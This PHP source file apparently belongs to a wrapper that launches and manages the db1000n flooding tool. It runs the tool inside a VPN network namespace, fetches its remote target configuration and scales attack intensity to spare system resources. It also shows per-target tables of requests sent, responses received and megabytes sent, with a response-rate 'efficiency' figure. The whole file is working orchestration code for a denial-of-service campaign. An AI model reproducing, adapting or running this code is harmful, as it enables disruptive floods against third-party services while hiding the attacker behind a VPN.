<?php

class db1000nApplication extends HackApplication
{
    private $wasLaunched = false,
            $launchFailed = false,
            $currentCountry = '',
            $stat = false;


    public function processLaunch()
    {
        global $DB1000N_SCALE;

        if ($this->launchFailed) {
            return -1;
        }

        if ($this->wasLaunched) {
            return true;
        }

        $command = "export GOMAXPROCS=1 ;   export SCALE_FACTOR={$DB1000N_SCALE} ;   "
                 . 'ip netns exec ' . $this->vpnConnection->getNetnsName() . '   '
                 . "nice -n 10   /sbin/runuser -p -u hack-app -g hack-app   --   "
                 . static::$db1000nCliPath . "  --prometheus_on=false  " . static::getCmdArgsForConfig() . '   '
                 . "--log-format=json    2>&1";

        $this->log($command);
        $descriptorSpec = array(
            0 => array("pipe", "r"),  // stdin
            1 => array("pipe", "w"),  // stdout
            2 => array("pipe", "a")   // stderr
        );
        $this->process = proc_open($command, $descriptorSpec, $this->pipes);
        $this->processPGid = procChangePGid($this->process, $log);
        $this->log($log);
        if ($this->processPGid === false) {
            $this->terminateAndKill(true);
            $this->log('Command failed: ' . $command);
            $this->launchFailed = true;
            return -1;
        }

        stream_set_blocking($this->pipes[1], false);
        $this->wasLaunched = true;
        return true;
    }

    protected function processJsonLine($line, $lineObj)
    {
        $ret = '';

        if (
                isset($lineObj->level)
            &&  $lineObj->level === 'info'
            &&  $lineObj->msg   === 'location info'
        ) {
            $this->currentCountry = $lineObj->country;
        }
        //-----------------------------------------------------
        else if (
                isset($lineObj->level)
            &&  $lineObj->level === 'info'
            &&  $lineObj->msg   === 'stats'
        ) {
            if (isset($lineObj->targets)) {
                $this->stat = $lineObj;
            }
        }
        //-----------------------------------------------------
        else if (
               isset($lineObj->level)
            && $lineObj->level === 'info'
            && in_array($lineObj->msg, [
                'running db1000n',
                'Attacking',
                'single http request',
                'loading config',
                'the config has not changed. Keep calm and carry on!',
                'new config received, applying',
                'checking IP address,',
                'job instances (re)started',
                'you might need to enable VPN.',
                'decrypted config'
            ])
        ) {
            // Do nothing
        }
        //-----------------------------------------------------
        else if (
                isset($lineObj->level)
            &&  $lineObj->level === 'warn'
            &&  in_array($lineObj->msg, [
                'error fetching location info',
                'Failed to check the country info'
            ])
        ) {
            // Do nothing
        }
        //-----------------------------------------------------
        else {
            $color = Term::clear;
            if (
                   isset($lineObj->level)
                && $lineObj->level === 'info'
            ) {
                $color = Term::gray;
            }
            $ret .= $this->lineObjectToString($lineObj, $color) . "\n\n";
        }

        return $ret;
    }

    public function getStatisticsBadge() : ?string
    {
        global $LOG_WIDTH, $LOG_PADDING_LEFT;
        if (!$this->stat  ||  !$this->stat->targets) {
            return null;
        }

        if (is_object($this->stat->targets)) {
            $targets = get_object_vars($this->stat->targets);
            ksort($targets);
            $this->stat->targets = $targets;
        }

        if (!count($this->stat->targets)) {
            return null;
        }

        $columnsDefinition = [
            [
                'title' => ['Target'],
                'width' => $LOG_WIDTH - $LOG_PADDING_LEFT - 11 * 4,
                'trim'  => 4
            ],
            [
                'title' => ['Requests', 'attempted'],
                'width' => 11,
                'alignRight' => true
            ],
            [
                'title' => ['Requests' , 'sent'],
                'width' => 11,
                'alignRight' => true
            ],
            [
                'title' => ['Responses', 'received'],
                'width' => 11,
                'alignRight' => true
            ],
            [
                'title' => ['MiB', 'sent'],
                'width' => 11,
                'alignRight' => true
            ]
        ];
        $rows[] = [];

        $this->stat->db1000nx100 = new stdClass();
        $this->stat->db1000nx100->totalHttpRequests = 0;
        $this->stat->db1000nx100->totalHttpResponses = 0;
        foreach ($this->stat->targets as $targetName => $targetStat) {
            $mibSent = roundLarge($targetStat->bytes_sent / 1024 / 1024);
            $row = [
                $targetName,
                $targetStat->requests_attempted,
                $targetStat->requests_sent,
                $targetStat->responses_received,
                $mibSent
            ];
            $rows[] = $row;

            //$pattern = '#^https?:\/\/#';
            //if (preg_match($pattern, $targetName, $matches)) {
                $this->stat->db1000nx100->totalHttpRequests  += $targetStat->requests_attempted;
                $this->stat->db1000nx100->totalHttpResponses += $targetStat->responses_received;                
            //}
        }

        //------- Total row
        $rows[] = [];  // new line
        $totalMiBSent = roundLarge($this->stat->total->bytes_sent / 1024 / 1024);
        $row = [
            'Total',
            $this->stat->total->requests_attempted,
            $this->stat->total->requests_sent,
            $this->stat->total->responses_received,
            $totalMiBSent
        ];
        $rows[] = $row;

        return mbRTrim(generateMonospaceTable($columnsDefinition, $rows));
    }

    // Should be called after getLog()
    public function getEfficiencyLevel()
    {

        if (!isset($this->stat->db1000nx100->totalHttpRequests)) {
            return null;
        }

        $requests = $this->stat->db1000nx100->totalHttpRequests;
        $responses = $this->stat->db1000nx100->totalHttpResponses;

        if (!$requests) {
            return null;
        }

        $averageResponseRate = $responses * 100 / $requests;
        return roundLarge($averageResponseRate);
    }

    // Should be called after getLog()
    public function getCurrentCountry()
    {
        return $this->currentCountry;
    }

    public function terminate($hasError)
    {
        if ($this->processPGid) {
            $this->log("db1000n terminate PGID -{$this->processPGid}");
            @posix_kill(0 - $this->processPGid, SIGTERM);
        }

        $this->terminated = true;
    }

    public function kill()
    {
        if ($this->processPGid) {
            $this->log("db1000n kill PGID -{$this->processPGid}");
            @posix_kill(0 - $this->processPGid, SIGKILL);
        }
        @proc_terminate($this->process, SIGKILL);
        @proc_close($this->process);
    }

    // ----------------------  Static part of the class ----------------------

    private static $db1000nCliPath,
                   $localConfigPath,
                   $useLocalConfig;

    public static function constructStatic()
    {
        global $TEMP_DIR;

        static::$localConfigPath = $TEMP_DIR . '/db1000n-config.json';
        static::$db1000nCliPath  = __DIR__ . '/db1000n';
        static::$useLocalConfig = false;

        Actions::addFilter('KillZombieProcesses',            [static::class, 'filterKillZombieProcesses']);
        Actions::addFilter('InitSessionResourcesCorrection', [static::class, 'filterInitSessionResourcesCorrection']);
        Actions::addAction('AfterInitSession',               [static::class, 'actionAfterInitSession']);

        Actions::addAction('BeforeTerminateSession',         [static::class, 'terminateInstances']);
        Actions::addAction('BeforeTerminateFinalSession',    [static::class, 'terminateInstances']);
        Actions::addAction('TerminateSession',               [static::class, 'killInstances']);
        Actions::addAction('TerminateFinalSession',          [static::class, 'killInstances']);
    }

    public static function filterKillZombieProcesses($data)
    {
        killZombieProcesses($data['linuxProcesses'], [], static::$db1000nCliPath);
        return $data;
    }

    public static function filterInitSessionResourcesCorrection($usageValues)
    {
        global $DB1000N_SCALE, $DB1000N_SCALE_MIN, $DB1000N_SCALE_MAX, $DB1000N_SCALE_MAX_STEP;

        $usageValuesCopy = $usageValues;
        unset($usageValuesCopy['systemAverageTmpUsage']);
        unset($usageValuesCopy['systemPeakTmpUsage']);

        MainLog::log('db1000n scale calculation rules', 1, 0, MainLog::LOG_DEBUG);
        $resourcesCorrection = ResourcesConsumption::getResourcesCorrection($usageValuesCopy);
        $correctionPercent   = $resourcesCorrection['percent'] ?? false;

        if ($correctionPercent) {
            $previousSessionDb1000nScale = $DB1000N_SCALE;

            $diff = round($correctionPercent * $previousSessionDb1000nScale / 100, 3) ;
            $diff = fitBetweenMinMax(-$DB1000N_SCALE_MAX_STEP, $DB1000N_SCALE_MAX_STEP, $diff);

            $DB1000N_SCALE = $previousSessionDb1000nScale + $diff;
            $DB1000N_SCALE = fitBetweenMinMax($DB1000N_SCALE_MIN, $DB1000N_SCALE_MAX, $DB1000N_SCALE);

            if ($DB1000N_SCALE !== $previousSessionDb1000nScale) {
                MainLog::log($diff > 0  ?  'Increasing' : 'Decreasing', 0);
                MainLog::log(" db1000n scale value from $previousSessionDb1000nScale to $DB1000N_SCALE because of the rule \"" . $resourcesCorrection['rule'] . '"');
            }
        }
        MainLog::log("db1000n scale value $DB1000N_SCALE, range $DB1000N_SCALE_MIN-$DB1000N_SCALE_MAX", 2);
        return $usageValues;
    }

    private static function loadConfig()
    {
        $descriptorSpec = array(
            0 => array("pipe", "r"),  // stdin
            1 => array("pipe", "w"),  // stdout
            2 => array("pipe", "w")   // stderr
        );

        $db1000nCfgUpdater     = proc_open(__DIR__ . "/db1000n  --log-format json  -updater-mode  -updater-destination-config " . static::$localConfigPath, $descriptorSpec, $pipes);
        $db1000nCfgUpdaterPGid = procChangePGid($db1000nCfgUpdater);
        if ($db1000nCfgUpdaterPGid === false) {
            MainLog::log('Failed to run db1000n in "config updater" mode');
            return;
        }

        stream_set_blocking($pipes[2], false);
        $timeout = 30;
        $delay = 0.1;
        $configDownloadedSuccessfully = false;

        do {
            $stdout = streamReadLines($pipes[2], 0.05);
            $lines = mbSplitLines($stdout);
            foreach ($lines as $line) {
                $obj = @json_decode($line);
                if (is_object($obj)) {
                    if ($obj->msg === 'loading config') {
                        MainLog::log('Config file for db1000n downloaded from ' . $obj->path);
                    }
                    if (
                            $obj->msg === 'Saved file'
                        &&  $obj->size > 0
                    ) {
                        $configDownloadedSuccessfully = true;
                        break 2;
                    }
                }
            }
            sayAndWait($delay);
            $timeout -= $delay;
        } while ($timeout > 0);

        @posix_kill(0 - $db1000nCfgUpdaterPGid, SIGTERM);
        if (! $configDownloadedSuccessfully) {
            MainLog::log('Failed to downloaded config file for db1000n');
        }
    }

    private static function getCmdArgsForConfig()
    {
        if (! static::$useLocalConfig) {
            return '';
        }

        return ' -c="' . static::$localConfigPath . '" ';
    }

    public static function actionAfterInitSession()
    {
        @unlink(static::$localConfigPath);
        static::loadConfig();
        if (file_exists(static::$localConfigPath)) {
            static::$useLocalConfig = true;
        } else {
            static::$useLocalConfig = false;
        }

        // ---

        global $SESSIONS_COUNT, $DB1000N_SCALE, $DB1000N_SCALE_MIN, $DB1000N_SCALE_MAX;
        if ($SESSIONS_COUNT === 1) {
            MainLog::log("db1000n initial scale $DB1000N_SCALE, range $DB1000N_SCALE_MIN-$DB1000N_SCALE_MAX");
        }
    }

}

db1000nApplication::constructStatic();